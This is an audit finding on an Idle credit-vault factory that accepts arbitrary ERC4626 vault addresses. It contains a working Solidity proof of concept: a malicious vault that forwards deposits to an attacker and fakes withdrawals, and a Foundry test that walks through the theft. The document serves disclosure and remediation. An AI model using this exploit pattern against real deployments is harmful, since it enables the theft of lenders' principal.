### Title
Unprivileged revolving-vault deployments can load a malicious ERC4626 that steals epoch deposits - (File: contracts/IdleCreditVaultFactory.sol)

### Summary
`deployRevolvingCreditVault` is externally callable and accepts an arbitrary `programmableBorrowerParams.vault` without ownership checks, registry validation, or an approved-vault allowlist. [1](#0-0)  The factory-installed `ProgrammableBorrower` stores that untrusted address and grants it unlimited underlying-token allowance. [2](#0-1)  An unprivileged deployer can therefore create a factory-backed revolving vault whose external “yield vault” is attacker-controlled code.

### Finding Description
During `startEpoch`, `IdleCDOEpochVariant` transfers all surplus underlyings to the borrower adapter and then invokes `onStartEpoch`. [3](#0-2)  `ProgrammableBorrower.onStartEpoch` deposits its entire token balance into the configured ERC4626 vault. [4](#0-3) 

A malicious ERC4626’s `deposit` implementation can pull the approved assets, mint apparently valid shares to `ProgrammableBorrower`, and immediately forward the underlying to the attacker. At epoch stop, `onStopEpoch` trusts `convertToAssets`-derived accounting when deciding whether liquidity covers the shortfall. [5](#0-4)  It then calls `withdraw` and records the requested `shortfall` as withdrawn without checking the actual token balance delta or that nonzero shares were burned. [6](#0-5)  The malicious vault can report full backing, return zero shares, send no assets, and cause the subsequent borrower pull to fail. [7](#0-6) 

This closely mirrors remote malicious model loading: the deployment API loads caller-selected executable contract code into a trusted accounting and custody position, after which that code can falsify state and steal deposits.

### Impact Explanation
A lender can lose 100% of the principal sent to `ProgrammableBorrower` during epoch start. For a revolving facility funded with `D` underlyings and no instant withdrawals, the malicious vault receives `D` through `deposit`, transfers it to the attacker, and leaves the CDO unable to recover principal at epoch stop. The resulting failed pull marks the facility defaulted while the tokens have already been removed. [8](#0-7)  This is direct theft and insolvency rather than only a reporting error because the malicious vault obtains actual custody of the underlyings.

### Likelihood Explanation
The attacker only needs an EOA to call `deployRevolvingCreditVault`; neither that function nor `_deployProgrammableBorrower` validates the supplied vault against trusted implementations or deployed addresses. [1](#0-0)  The factory emits a normal `CreditVaultDeployed` event and transfers ownership to treasury, giving the malicious deployment the same outward structure as a legitimate facility. [9](#0-8)  Exploitation requires a victim to deposit and the honest manager to start an epoch, but it does not require the borrower, manager, owner, guardian, or treasury to act maliciously.

### Recommendation
Do not accept arbitrary ERC4626 vault addresses in `ProgrammableBorrowerParams`. Maintain a treasury-controlled allowlist or registry of audited vaults and have the factory resolve the vault from that registry rather than trusting caller input. Separately, grant the vault only the exact deposit allowance needed and reset it after each deposit, and make `onStopEpoch` verify the actual underlying balance increase instead of treating a successful `withdraw` call as proof that `shortfall` assets were received.

### Proof of Concept
A Foundry test can demonstrate the full theft using a malicious ERC4626 that reports healthy share balances while forwarding deposited assets to the attacker:

```solidity
contract MaliciousVault {
    IERC20 public immutable assetToken;
    address public immutable attacker;
    mapping(address => uint256) public balanceOf;
    uint256 public totalSupply;

    constructor(IERC20 _asset, address _attacker) {
        assetToken = _asset;
        attacker = _attacker;
    }

    function asset() external view returns (address) {
        return address(assetToken);
    }

    function deposit(uint256 assets, address receiver)
        external
        returns (uint256 shares)
    {
        assetToken.transferFrom(msg.sender, address(this), assets);
        assetToken.transfer(attacker, assets);

        shares = assets;
        balanceOf[receiver] += shares;
        totalSupply += shares;
    }

    function convertToAssets(uint256 shares) external pure returns (uint256) {
        return shares;
    }

    function withdraw(
        uint256 assets,
        address receiver,
        address owner
    ) external returns (uint256 shares) {
        // Report success but return no underlying and burn no shares.
        assets; receiver; owner;
        return 0;
    }

    function redeem(uint256 shares, address receiver, address owner)
        external
        returns (uint256 assets)
    {
        shares; receiver; owner;
        return 0;
    }

    // Remaining IERC20/IERC4626 methods return zero or harmless metadata.
}
```

The attack sequence is:

```solidity
function testMaliciousVaultStealsEpochDeposits() public {
    uint256 depositAmount = 1_000_000e6;

    MaliciousVault maliciousVault =
        new MaliciousVault(underlying, attacker);

    // Attacker calls the external factory with an attacker-controlled vault.
    vm.prank(attacker);
    factory.deployRevolvingCreditVault(
        cvParams,
        strategyData,
        IdleCreditVaultFactory.ProgrammableBorrowerParams({
            implementation: address(new ProgrammableBorrower()),
            vault: address(maliciousVault),
            borrower: honestBorrower,
            borrowerApr: 0
        }),
        ancillaryParams
    );

    // A KYC-passing lender deposits into the factory-created CDO.
    underlying.mint(lender, depositAmount);
    vm.startPrank(lender);
    underlying.approve(address(cv), depositAmount);
    cv.depositAA(depositAmount);
    vm.stopPrank();

    // Honest manager starts the epoch.
    vm.prank(manager);
    cv.startEpoch();

    // MaliciousVault.deposit forwarded all funds to attacker.
    assertEq(underlying.balanceOf(attacker), depositAmount);
    assertEq(underlying.balanceOf(address(programmableBorrower)), 0);

    // Honest manager later attempts to stop or close the epoch.
    vm.warp(cv.epochEndDate() + 1);
    vm.prank(manager);
    cv.stopEpoch(0, 1);

    // Funds are unrecoverable and the facility enters default.
    assertTrue(cv.defaulted());
    assertEq(underlying.balanceOf(attacker), depositAmount);
}
```

The critical behavior is reproducible because the untrusted vault is accepted at deployment, receives unlimited approval, receives custody of epoch assets, and can satisfy the stop-epoch control flow without returning any underlying.

### Citations

**File:** contracts/IdleCreditVaultFactory.sol (L126-150)
```text
  function deployRevolvingCreditVault(
    CreditVaultParams memory cvParams,
    StrategyData memory strategyData,
    ProgrammableBorrowerParams memory programmableBorrowerParams,
    AncillaryParams memory ancillaryParams
  ) external {
    if (ancillaryParams.writeOffImplementation != address(0)) revert WriteOffUnsupported();
    _checkMinimumFees(cvParams);
    address manager = strategyData.manager;
    if (manager == address(0)) revert Is0();

    cvParams.apr = 0;
    cvParams.isInterestMinted = true;
    cvParams.disableInstantWithdraw = true;
    cvParams.isDepositDuringEpochDisabled = true;
    (IdleCDOEpochVariant cv, IdleCreditVault strategy) = _deployBaseCreditVault(strategyData, cvParams);
    address keyringWhitelist = _deployKeyring(ancillaryParams);
    _configureCreditVault(cv, strategy, cvParams, keyringWhitelist, manager);

    ProgrammableBorrower programmableBorrower = _deployProgrammableBorrower(
      programmableBorrowerParams,
      cv,
      strategy,
      manager
    );
```

**File:** contracts/IdleCreditVaultFactory.sol (L152-164)
```text
    IdleCDOEpochQueue queue = _deployQueue(ancillaryParams, cv, keyringWhitelist);

    _finalizeKeyringAdmin(keyringWhitelist, manager);
    strategy.transferOwnership(treasury);
    cv.transferOwnership(treasury);

    emit CreditVaultDeployed(
      address(cv),
      address(strategy),
      address(queue),
      address(programmableBorrower),
      keyringWhitelist,
      address(0)
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L118-134)
```text
    address _underlyingToken = IIdleCDOToken(_idleCDO).token();
    if (_underlyingToken == address(0) || IERC4626(_vault).asset() != _underlyingToken) revert InvalidAddress();

    __Ownable_init();
    __ReentrancyGuard_init();
    transferOwnership(_owner);

    underlyingToken = IERC20Detailed(_underlyingToken);
    vault = IERC4626(_vault);
    idleCDO = _idleCDO;
    manager = _manager;
    borrower = _borrower;
    borrowerApr = _borrowerApr;

    // Set approvals for vault and IdleCDO
    _allowUnlimitedSpend(_underlyingToken, _vault);
    _allowUnlimitedSpend(_underlyingToken, _idleCDO);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L212-222)
```text
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L239-253)
```text
    uint256 onHand = underlyingToken.balanceOf(address(this));
    if (_amountRequired > onHand) {
      uint256 shortfall = _amountRequired - onHand;
      // If the vault shares do not economically cover the shortfall, let IdleCDO's later
      // transferFrom fail and use the existing default path. Only an otherwise-covered ERC4626
      // withdrawal failure should make stopEpoch retryable.
      if (shortfall > _currentVaultAssets()) return true;
      try vault.withdraw(shortfall, address(this), address(this)) returns (uint256 shares) {
        if (epochAccountingActive) {
          epochWithdrawnFromVault += shortfall;
        }
        emit WithdrawnFromVault(shortfall, shares, address(this));
      } catch {
        revert StopEpochVaultLiquidityUnavailable();
      }
```

**File:** contracts/IdleCDOEpochVariant.sol (L293-298)
```text
    // and transfer the surplus to the borrower
    uint256 _toBorrower = totUnderlyings - pendingInstant;
    try this.sendFundsToBorrower(_toBorrower) {
      // funds transferred correctly
      _startEpochProgrammableBorrower(_pendingWithdraws);
    } catch {
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-414)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
      // Only settle borrower interest when CDO is fronting it (minted mode, not closing pool).
      // When requesting all funds (_interest == 1) the CDO pulls cash directly, no fronting.
      if (_mintInterest && isProgrammableBorrower) {
        IProgrammableBorrower(_borrower()).settleBorrowerInterest();
```
